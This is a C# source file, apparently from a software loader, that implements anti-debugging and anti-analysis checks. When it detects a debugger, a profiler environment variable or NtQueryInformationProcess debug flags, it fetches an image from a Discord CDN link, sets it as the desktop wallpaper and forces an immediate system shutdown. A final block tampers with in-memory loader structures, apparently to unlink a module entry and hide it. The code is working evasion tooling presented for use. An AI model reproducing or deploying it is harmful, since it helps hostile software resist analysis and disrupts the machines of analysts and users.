using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Loader.Security.AntiDebug
{
    class Anti_Dbg
    {
        [DllImport("ntdll.dll", CharSet = CharSet.Auto)]
        private static extern int NtQueryInformationProcess(IntPtr test, int test2, int[] test3, int test4, ref int test5);

        public sealed class Wallpaper
        {
            //Credits to http://eddiejackson.net/wp/?p=21967
            Wallpaper() { }

            const int SPI_SETDESKWALLPAPER = 20;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDWININICHANGE = 0x02;

            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

            public enum Style : int
            {
                Fill,
                Fit,
                Span,
                Stretch,
                Tile,
                Center
            }

            public static void Set(string url, Style style)
            {
                System.IO.Stream streamedimage = new System.Net.WebClient().OpenRead(url);

                System.Drawing.Image img = System.Drawing.Image.FromStream(streamedimage);
                string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
                img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                if (style == Style.Fill)
                {
                    key.SetValue(@"WallpaperStyle", 10.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }
                if (style == Style.Fit)
                {
                    key.SetValue(@"WallpaperStyle", 6.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }
                if (style == Style.Span)
                {
                    key.SetValue(@"WallpaperStyle", 22.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }
                if (style == Style.Stretch)
                {
                    key.SetValue(@"WallpaperStyle", 2.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }
                if (style == Style.Tile)
                {
                    key.SetValue(@"WallpaperStyle", 0.ToString());
                    key.SetValue(@"TileWallpaper", 1.ToString());
                }
                if (style == Style.Center)
                {
                    key.SetValue(@"WallpaperStyle", 0.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }

                SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0,
                    tempPath,
                    SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
        }
        public static void Initialize()
        {
            if (Debugger.IsLogging())
            {
                Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Wallpaper.Style.Fill);
                Process.Start("shutdown", "/s /t 0");
                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
                Environment.Exit(0); 
            
            }
            if (Debugger.IsAttached)
            {
                Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Wallpaper.Style.Fill);
                Process.Start("shutdown", "/s /t 0");
                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
                Environment.Exit(0);

            }
            if (Environment.GetEnvironmentVariable("complus_profapi_profilercompatibilitysetting") != null)
            {
                Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Wallpaper.Style.Fill);
                Process.Start("shutdown", "/s /t 0");
                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
                Environment.Exit(0);

            }
            if (string.Compare(Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING"), "1", StringComparison.Ordinal) == 0)
            {
                Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Wallpaper.Style.Fill);
                Process.Start("shutdown", "/s /t 0");
                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
                Environment.Exit(0);

            }

            if (Environment.OSVersion.Platform != PlatformID.Win32NT) return;
            var array = new int[6];
            var num = 0;
            var intPtr = Process.GetCurrentProcess().Handle;
            if (NtQueryInformationProcess(intPtr, 31, array, 4, ref num) == 0 && array[0] != 1)
            {
                Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Wallpaper.Style.Fill);
                Process.Start("shutdown", "/s /t 0");
                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
                Environment.Exit(0);

            }
            if (NtQueryInformationProcess(intPtr, 30, array, 4, ref num) == 0 && array[0] != 0)
            {
                Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Wallpaper.Style.Fill);
                Process.Start("shutdown", "/s /t 0");
                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
                Environment.Exit(0);

            }

            if (NtQueryInformationProcess(intPtr, 0, array, 24, ref num) != 0) return;
            intPtr = Marshal.ReadIntPtr(Marshal.ReadIntPtr((IntPtr)array[1], 12), 12);
            Marshal.WriteInt32(intPtr, 32, 0);
            var intPtr2 = Marshal.ReadIntPtr(intPtr, 0);
            var ptr = intPtr2;
            do
            {
                ptr = Marshal.ReadIntPtr(ptr, 0);
                if (Marshal.ReadInt32(ptr, 44) != 1572886 ||
                    Marshal.ReadInt32(Marshal.ReadIntPtr(ptr, 48), 0) != 7536749) continue;
                var intPtr3 = Marshal.ReadIntPtr(ptr, 8);
                var intPtr4 = Marshal.ReadIntPtr(ptr, 12);
                Marshal.WriteInt32(intPtr4, 0, (int)intPtr3);
                Marshal.WriteInt32(intPtr3, 4, (int)intPtr4);
            }
            while (!ptr.Equals(intPtr2));
        }
    }
}
